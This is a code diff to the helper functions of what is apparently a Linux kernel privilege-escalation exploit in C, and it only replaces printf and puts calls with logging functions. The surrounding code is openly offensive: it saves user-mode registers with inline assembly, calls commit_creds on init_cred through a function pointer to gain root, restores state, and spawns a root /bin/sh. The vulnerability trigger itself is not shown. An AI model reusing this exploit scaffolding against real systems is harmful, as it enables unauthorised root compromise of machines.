@@ -6,11 +6,11 @@
 void spawn_root_shell(void) {
     uid_t uid = getuid();
     if (uid != 0) {
-        printf("[-] failed to get root (uid: %d)\n", uid);
+        log_error("failed to get root (uid: %d)", uid);
         exit(1);
     }
-    puts("[+] got root (uid = 0)");
-    puts("[ ] spawning shell");
+    log_success("got root (uid = 0)");
+    log_info("spawning shell");
     char *argv[] = {"/bin/sh", NULL};
     char *envp[] = {NULL};
     execve("/bin/sh", argv, envp);
@@ -18,7 +18,7 @@ void spawn_root_shell(void) {
 }
 
 void save_state(void) {
-    puts("[ ] saving user cs, ss, rsp, and rflags");
+    log_info("saving user cs, ss, rsp, and rflags");
     asm volatile(
         ".intel_syntax noprefix;"
         "mov %0, cs;"
@@ -30,16 +30,16 @@ void save_state(void) {
         : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_flags)
         :
         : "memory");
-    printf("      user_cs     = 0x%016lx\n", user_cs);
-    printf("      user_flags = 0x%016lx\n", user_flags);
-    printf("      user_sp    = 0x%016lx\n", user_sp);
-    printf("      user_ss     = 0x%016lx\n", user_ss);
+    log_with_prefix("     ", "user_cs     = 0x%016lx", user_cs);
+    log_with_prefix("     ", "user_flags  = 0x%016lx", user_flags);
+    log_with_prefix("     ", "user_sp     = 0x%016lx", user_sp);
+    log_with_prefix("     ", "user_ss     = 0x%016lx", user_ss);
 }
 
 void restore_state(void) {
-    puts("[+] restoring state");
+    log_success("restoring state");
     if (user_sp == 0) {
-        puts("[-] please call save_state in advance");
+        log_error("please call save_state in advance");
         exit(EXIT_FAILURE);
     }
     asm volatile(
@@ -57,7 +57,7 @@ void restore_state(void) {
 }
 
 void escalate_privilege(void) {
-    puts("[+] escalating privilege");
+    log_success("escalating privilege");
     void (*cc)(char *) = (void *)(addr_commit_creds);
     (*cc)((char *)addr_init_cred);
     restore_state();
